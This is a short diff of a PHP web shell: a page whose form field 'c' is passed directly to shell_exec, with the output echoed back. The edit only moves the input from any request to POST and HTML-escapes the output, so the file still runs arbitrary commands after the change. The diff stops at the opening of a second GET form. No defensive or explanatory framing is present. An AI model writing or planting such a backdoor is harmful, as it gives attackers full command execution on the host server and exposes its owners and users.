@@ -1,13 +1,12 @@
 <?php
-if (isset($_REQUEST['c'])) {
-    echo "<pre>" . shell_exec($_REQUEST['c']) . "</pre>";
+if (isset($_POST['c'])) {
+    echo "<pre>" . htmlspecialchars(shell_exec($_POST['c'])) . "</pre>";
 }
 ?>
 <form method="post">
 <input name="c" size="50">
 <input type="submit" value="Run">
 </form>
-
 
 <HTML><BODY>
 <FORM METHOD="GET" NAME="myform" ACTION="">
